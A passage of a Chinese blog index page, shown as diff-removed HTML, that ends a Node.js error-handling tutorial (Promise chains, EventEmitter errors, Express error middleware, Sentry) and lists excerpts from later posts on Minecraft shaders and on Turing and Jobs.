function_">error</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>这里我们将文件复制了三次，在主逻辑中我们依然没有去关心错误的情况，因为任何一个步骤发生了错误，都会到达最后的 catch 块中，这就是所谓的 Pormise chain, 但需要注意的是记得要在每个「返回 Promise 的函数」中添加 return, 否则调用者没有办法感知到你返回了一个 Promise.</p>
-<p>语言内建的同步异常提供了调用栈，那么通过 Promise 传递的异步异常的调用栈会是什么样子的呢：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: EACCES: permission denied, open &#x27;to&#x27;</span><br><span class="line">    at Error (native)</span><br></pre></td></tr></table></figure>
-
-<p>就像我们前面提到的那样，我们只能看到来自 JavaScript 引起的调用，而看不到这个异步任务的创建者。但实际上很多 Promise 的实现提供了一个「记录异步调用栈」的功能，当开启了这个选项之后：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Error: EACCES: permission denied, open &#x27;to&#x27;</span><br><span class="line">    at Error (native)</span><br><span class="line">From previous event:</span><br><span class="line">    at ~/test.js:15:15</span><br><span class="line">    at FSReqWrap.readFileAfterClose(fs.js:380:3)</span><br><span class="line">From previous event:</span><br><span class="line">    at copyFileContent (~/test.js:14:28)</span><br><span class="line">    at ~/test.js:20:10</span><br></pre></td></tr></table></figure>
-
-<p>我们便可以看到创建这个异步任务的行号和更多的调用栈了，虽然这个选项对性能有一定影响，但我仍然建议开启这个选项，它将会很大程度上加快你定位线上错误的速度。</p>
-<p>那么 Node.js style callback 是否有能力记录这样的异步调用栈呢？我的答案是不能，因为在 Node.js style callback 中，我们是直接在使用调用者传递进来的 callback, 中间没有任何的胶合代码允许我们插入记录调用栈的逻辑，除非手动在每一次调用时去添加调用栈，这样便会对业务代码产生侵入式的影响。而在 Promise 中，所有异步任务的回调都被包裹在一个 <code>.then</code> 中，异步调用都是间接地通过 Promise 完成的，这给了 Promise 实现记录异步调用栈的机会，而不会影响到业务代码。</p>
-<p>当大家在争论 Promise 和 asycn&#x2F;await 谁才是未来的时候，可能忘记了 Node.js 还有个 events 模块，提供了基于事件的异步流程控制机制。如果说 Node.js style callback 和 Promise 都是一个操作对应一个结果的话，那么 EventEmitter 则提供了一个操作（甚至没有操作）对应多个结果的异步模型：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redisClient = redis.<span class="title function_">createClient</span>();</span><br><span class="line"></span><br><span class="line">redisClient.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>EventEmitter 提供了一种基于事件的通知机制，每个事件的含义其实是由使用者自己定义的，但它对于 error 事件却有一些特殊处理：如果发生了 error 事件，但却没有任何一个监听器监听 error 事件，EventEmiter 就会把这个错误直接抛出 —— 通常会导致程序崩溃退出。</p>
-<p>标准库里的很多组件和一些第三方库都会使用 EventEmitter, 尤其是例如数据库这类的长链接，我们要确保监听了它们的 error 事件 —— 哪怕是打印到日志中。其实这里也比较坑，因为当我们在使用第三方库的时候，除非文档上写了，否则我们可能并不知道它在哪里用到了 EventEmitter（有的库可能有多个地方都用到了）。</p>
-<p>Node.js 中的 Stream 也是基于 EventEmitter 的：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> source = fs.<span class="title function_">createReadStream</span>(<span class="keyword">from</span>);</span><br><span class="line">  <span class="keyword">var</span> target = fs.<span class="title function_">createWriteStream</span>(to);</span><br><span class="line"></span><br><span class="line">  source.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  &#125;).<span class="title function_">pipe</span>(target).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在上面的例子中，我创建了一个读文件的流和一个写文件的流，并将读文件的流 <code>.pipe</code> 到写文件的流，实现一个复制文件内容的功能。我们一开始看到 pipe 这个函数，可能会以为它会将前面的流的错误一起传递给后面的流，然后仅需在最后加一个 error 事件的处理器即可。但其实不然，我们需要去为每一个流去监听 error 事件。</p>
-<p>如果有异常没有捕捉到怎么样？如果有一个异常一直被传递到最顶层调用栈还没有被捕捉，那么就会导致进程的崩溃退出，不过我们还有两个终极捕捉手段：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;unhandledRejection&#x27;</span>, <span class="function">(<span class="params">reason, p</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(reason, p);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>uncaughtException 事件可以捕捉到那些已经被抛出到最顶层调用栈的异常，一旦添加了这个监听器，这些异常便不再会导致进程退出。实际上有一些比较激进的人士认为程序一旦出现事先没有预料到的错误，就应该立刻崩溃，以免造成进一步的不可控状态，也为了提起开发人员足够的重视。但我从比较务实的角度建议还是不要这样做，尤其是服务器端程序，一个进程崩溃重启可能需要一分钟左右的时间，这段时间会造成服务的处理能力下降，也会造成一部分连接没有被正确地处理完成，这个后果很可能是更加严重的。</p>
-<p>当我们应当将在这个事件中捕捉到的错误视作非常严重的错误，因为在此时已经丢失了和这个错误有关的全部上下文，必然无法妥善地处理这个错误，唯一能做的就是打印一条日志。</p>
-<p>unhandledRejection 事件可以捕捉到那些被 reject 但没有被添加 <code>.catch</code> 回调的 Promise, 通常是因为你忘记为一个返回 Promise 的函数添加 return。因为 Promise 本来就是对异步错误的一种封装，所以实际使用中偶尔也会出现 Promise 先被 reject, 而后再用 <code>.catch</code> 添加错误处理的情况，所以这个事件实际上偶尔会有误报。</p>
-<h2 id="传递异常"><a href="#传递异常" class="headerlink" title="传递异常"></a>传递异常</h2><p>前面我们按照 Node.js 中不同的异步流程控制方法介绍了如何捕捉和传递异常，接下来我还要介绍一些传递异常的过程中的一些最佳实践：</p>
-<ul>
-<li>注意 Promise &#x2F; callback chain 不要从中间断开</li>
-<li><strong>只处理已知的、必须在这里处理的异常，其他异常继续向外抛出</strong></li>
-<li>不要轻易地丢弃一个异常</li>
-<li>传递的过程中可以向 err 对象上添加属性，补充上下文</li>
-</ul>
-<p>相信在调试过程中最让人恼火的事情就是明明有错误发生，但错误却没有正确地传递回来，通常是因为这个错误在代码中被「不小心」地处理掉了，因此我们应该在进行错误处理时去注意保障外层代码的「知情权」，仅去处理必须在此处处理的异常，应该严格地去判断异常的类型和 message，确保只处理预期的异常，而其他大部分的异常都要继续向外层抛出：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">writeLogs</span>(<span class="params">logs</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;out/logs&#x27;</span>, logs).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err.<span class="property">code</span> === <span class="string">&#x27;ENOENT&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> fs.<span class="title function_">mkdir</span>(<span class="string">&#x27;out&#x27;</span>).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;out/logs&#x27;</span>, logs);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里我们实现了向 <code>out/logs</code> 这个文件写入日志的函数，如果 out 这个目录不存在则会产生一个 <code>ENOENT</code> 的错误，我们非常确信这个错误应该通过创建 out 这个目录来解决，所以我们决定去捕捉 <code>fs.writeFile</code> 的错误，然后严格地去判断 <code>err.code</code>，如果不是 <code>ENOENT</code> 还要继续抛出。其实打印日志也算是处理异常的一种，如果没有必要在此处打印日志（例如你还会继续抛出这个错误），那么就不要轻易打印日志，否则就会出现我们前面提到的，程序中发生了一个错误，到处都在打印日志。</p>
-<p>既然我们不应该轻易地处理异常，那么显然也不应该轻易地丢弃一个异常：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">copyFileContent</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>).<span class="title function_">catch</span>( <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ignored</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>的确有时我们需要忽略一个错误，但即使要忽略错误，也应该去判断异常的类型，确保它的确是我们想要忽略的那种错误。</p>
-<p>前面我们提到了上下文对定位错误的重要性，有的时候我们可以捕捉异常，向上面附加一些上下文然后继续抛出：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mysqlQuery</span>(<span class="params">sql, placeholders</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> mysqlClient.<span class="title function_">exec</span>(sql, placeholders).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    err.<span class="property">sql</span> = sql;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里的例子是一个用来进行数据库查询的工具函数，当一个数据库查询失败了，我们最感兴趣的可能是这个查询是什么，因此在这里我们捕捉了查询失败时的异常，将 SQL 语句作为属性附加到异常上，然后继续抛出。</p>
-<p>还有的时候我们捕捉异常是为了回滚数据：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mysqlTransaction</span>(<span class="params">transaction</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> mysqlPool.<span class="title function_">getConnection</span>( <span class="function">(<span class="params">connection</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> connection.<span class="title function_">beginTransaction</span>().<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">transaction</span>(connection).<span class="title function_">then</span>( <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> connection.<span class="title function_">commit</span>().<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> connection.<span class="title function_">rollback</span>().<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里的例子是一个用来进行数据库事务操作的工具函数，我们先从连接池得到一个连接、开始一个事务，然后执行要在事务中进行的操作。如果操作执行完成，我们提交这个事务，如果执行失败，我们捕捉异常，然后将事务回滚，最后将异常继续向外层抛出 —— 因为作为一个工具函数我们并不知道这个事务的失败对于业务逻辑意味着什么。</p>
-<h2 id="在程序的边界处理异常"><a href="#在程序的边界处理异常" class="headerlink" title="在程序的边界处理异常"></a>在程序的边界处理异常</h2><p>前面我们讲了那么多都在提醒大家不要轻易地处理异常，而是让异常沿着调用栈向外层传递，在传递的过程中可能有一部分异常被忽略或以重试的方式被处理了，但还有一些「无法恢复」的异常被传递到了程序的「边界」，这些异常可能是预期的（无法成功执行的任务）或者非预期的（程序错误），所谓程序的边界可能是：</p>
-<ul>
-<li>Routers（对于 Web-backend 而言）</li>
-<li>UI Layer（对于 Web&#x2F;Desktop App 而言）</li>
-<li>Command Dispatcher（对于 CLI Tools 而言）</li>
-</ul>
-<p>我们需要在程序的边界来处理这些错误，例如：</p>
-<ul>
-<li>展示错误摘要</li>
-<li>发送响应、断开 HTTP 连接（Web-backend）</li>
-<li>退出程序（CLI Tools）</li>
-<li>记录日志</li>
-</ul>
-<p><strong>正因为这些错误最后被汇总到了一处，我们可以以一种统一的、健壮的方式去处理这些错误</strong>，例如在一个 Express 程序中，我们会有这样的代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">copyFileContent</span>(req.<span class="property">query</span>.<span class="property">from</span>, req.<span class="property">query</span>.<span class="property">to</span>).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>();</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(next);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  err.<span class="property">userId</span> = req.<span class="property">user</span>.<span class="property">id</span>;</span><br><span class="line">  err.<span class="property">url</span> = req.<span class="property">originalUrl</span>;</span><br><span class="line">  logger.<span class="title function_">error</span>(err);</span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">statusCode</span> || <span class="number">500</span>).<span class="title function_">send</span>(err.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>Express 是没有对 Promise 提供支持的，因此 Express 的中间件可以算是 Promise 代码的边界，我们需要手动地将异常传递给 Express 的 next, 以便进入到 Express 的错误处理流程。</p>
-<p>Express 提供了一种错误处理中间件，在这里我们依然保留着有关 HTTP 连接的上下文，一个比较好的实践是在这里将 HTTP 连接所关联的用户、请求的 URL 等信息作为上下文附加到错误对象上，然后将错误记录到日志系统中，最后向客户端发送一个错误摘要。</p>
-<p>这里只是一个简单的例子，在实际项目中这个错误处理中间件可能会很长很复杂，有很多内部的约定（例如 <code>err.statusCode</code>）来决定如何处理这个错误，正是因为错误被汇总到了这里，我们才有能力进行统一的处理。</p>
-<p>最后，我向大家推荐一个叫 <a target="_blank" rel="noopener" href="https://getsentry.com/">Sentry</a> 的开源软件，它提供了各个语言的 SDK, 仅需简单的配置就可以将错误发送到 Sentry 提供的一个 Web 服务上面（实际上我们的项目中就会在 Express 的错误处理中间件向 Sentry 发送错误）。Sentry 提供了一个 Web 的 Dashboard, 会将同类错误聚合在一起，显示每个错误在过去一段时间发生的次数、影响的用户数量。你还可以在向 Sentry 发送错误时提供额外的 Tag, Sentry 可以根据 Tag 进行统计和分析。Sentry 还可以通过添加规则的方式配置 Webhook 和邮件报警。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们来对今天的技术分享做一个简单的小结：</p>
-<ul>
-<li>在层次化的架构中，很多时候在当前的层级没有足够的信息去决定如何处理错误，因此我们需要使用异常来将错误沿着调用栈逆向抛出，直到某个层级有足够的信息来处理这个错误。</li>
-<li>在异步的场景下我们应该使用 Promise 或相兼容的流程控制工具来模拟异常机制。</li>
-<li>传递异常时可以回滚数据或向其补充上下文，但如非必要，需要继续向外抛出。</li>
-<li>让所有无法被恢复的错误传递到程序的「边界」处，统一处理。</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/10/02/2016/awesome-minecraft-shader/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/10/02/2016/awesome-minecraft-shader/" itemprop="url">劳资也是开得起 Minecraft 光影的男人辣！</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-02T21:52:50+08:00">
-                2016-10-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
-                    <span itemprop="name">日常</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-          <p>这次国庆去电脑城摸了块 GTX750（原先的 9800GT 实在是烂得不行了）和一块新硬盘回来，克隆完硬盘后就迫不及待地给 MC 打上了 <code>GLSL Shader Mod</code>。玩了一会后我的表情是这样的：<img src="https://img.prin.studio/images/2017/06/10/c066215f622f0bf2fe7ee9625955e343.jpg" alt="表情1"></p>
-<p>不得不说上了光影之后的 MC <strong>根本不是一个游戏啊</strong>！</p>
-<p><img src="https://img.prin.studio/images/2017/06/10/95e7cf170b0d4f5fbe87e97360faacb9.png" alt="Screenshot1"></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2016/10/02/2016/awesome-minecraft-shader/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/10/01/%E5%83%8F%E8%AF%97%E4%BA%BA%E4%B8%80%E6%A0%B7%E7%9D%BF%E6%99%BA%EF%BC%8C%E5%83%8F%E5%A4%A9%E6%89%8D%E4%B8%80%E6%A0%B7%E7%96%AF%E7%8B%82/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/10/01/%E5%83%8F%E8%AF%97%E4%BA%BA%E4%B8%80%E6%A0%B7%E7%9D%BF%E6%99%BA%EF%BC%8C%E5%83%8F%E5%A4%A9%E6%89%8D%E4%B8%80%E6%A0%B7%E7%96%AF%E7%8B%82/" itemprop="url">像诗人一样睿智，像天才一样疯狂</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-01T17:12:43+08:00">
-                2016-10-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">读书笔记</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-          可是人生其实本来是没有意义的，你从出生到走向死亡早已安排好，你需要做的就是“重写”这个过程，所以我们来到这个世界上，无非是想要认识些有趣的人、经历些有趣的事情，所以如果你对一件事情的成与败、一件东西得与失，都能做到坦然处之，或许你就不会再畏惧失败，当我们不再愿意为一件事情投入热情的时候，其实我们已经习惯了为自己的懒惰找到一个借口，你必须要相信你做的事情是最正确的事情，你必须要有一种敢于突破自我的激情，否则你注定只能做出平庸而普通的产品;一位同事给我推荐了《模仿游戏》这个电影，在此之前我对图灵这个人物的了解，无外乎他对整个计算机行业做出的革命性的贡献，以及他像谜一样的人生经历，可是通过这部电影，我看到的是一种天才般的疯狂和执著，图灵在被通知去接受破解德国加密装置“恩尼格玛”的任务时，军方对其进行了一个简单的面试，在面试中我们发现图灵或许不懂得什么是幽默，这种被我们称为“书呆子”的性格，在实际生活中是不讨喜的，在《黑客与画家》中作者明确地指出，“书呆子”不受欢迎是因为他们比普通人聪明，可是图灵很快就能发现，团队中有哪些人是不合格的解密者，而在这个过程中他因为不太懂得如何和别人相处，而被团队里的成员指责和谩骂，可他从来没有放弃过制造他的机器，而最终的结果的确是依靠他的机器计算出来的，天才的孤独在于常常不被常人理解，可是当图灵被强迫关闭他的机器的时候，团队中的成员愿意站在这一边，这一幕是让我感受到温情存在的，而这一切来自一个走进他生命中的女孩子：琼;这意味着我们需要去做些疯狂的事情，我们追求极致和完美，是因为我们想在这个世界上，留下属于我们自己的印记，没有人会明白，为什么乔布斯天生就有一种想要和 IBM 抗衡的想法，这种想法促成了让人们印象深刻的"1984"广告，其创意来自乔治·奥威尔的小说《一九八四》，并借助小说中的“大佬”映射当时的蓝色巨人 IBM，这个举动让苹果公司、让 Mac 成为人们心中理想主义的化身，这个举动相当地疯狂，不是吗
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2016/10/01/%E5%83%8F%E8%AF%97%E4%BA%BA%E4%B8%80%E6%A0%B7%E7%9D%BF%E6%99%BA%EF%BC%8C%E5%83%8F%E5%A4%A9%E6%89%8D%E4%B8%80%E6%A0%B7%E7%96%AF%E7%8B%82/">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/27/106-club-course/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="逐流小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/09/27/106-club-course/" itemprop="url">106 club course</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-27T02:14:00+08:00">
-                2016-09-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tutorial/" itemprop="url" rel="index">
-                    <span itemprop="name">tutorial</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
-     crossorigin="anonymous"></script>
-<ins class="adsbygoogle"
-     style="display:block; text-align:center;"
-     data-ad-layout="in-article"
-     data-ad-format="fluid"
-     data-ad-client="ca-pub-4522670236044605"
-     data-ad-slot="5167312561"></ins>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-      
-      
-
-      
-        
-        
-          
